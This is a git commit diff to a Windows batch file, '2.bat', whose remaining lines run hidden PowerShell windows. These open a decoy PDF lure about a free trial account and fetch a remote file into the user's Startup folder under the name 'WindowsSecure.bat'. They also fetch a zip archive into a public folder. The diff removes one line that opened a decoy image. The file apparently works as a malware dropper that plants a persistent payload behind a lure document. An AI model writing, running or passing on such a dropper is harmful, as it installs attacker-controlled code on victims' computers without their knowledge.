31e6c33d6b34ca5c92778aa6b452c487c79b8b85
bao3125 <104300198+bao3125@users.noreply.github.com>
2024-05-07 20:53:52 +0700

    Update 2.bat

--- 2.bat
+++ 2.bat
@@ -1,5 +1,4 @@
 @echo off
-powershell.exe -WindowStyle Hidden -Command "& {(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/bao3125/concac/main/photo_2024-05-07_20-20-19.jpg', \"$env:TEMP\album.jpg\"); start \"$env:TEMP\album.jpg\"}"
 powershell.exe -WindowStyle Hidden -Command "& {(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/bao3125/concac/main/1-Month-free-trial-access-account-Ad-World-Prime.pdf', \"$env:TEMP\document.pdf\"); start \"$env:TEMP\document.pdf\"}"
 powershell.exe -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://github.com/sdvsdv23rbfdb3/kjkj/raw/main/1', '%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsSecure.bat')"
 powershell.exe -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('http://raw.githubusercontent.com/bao3125/concac/main/Document.zip', 'C:\Users\Public\Document.zip')"
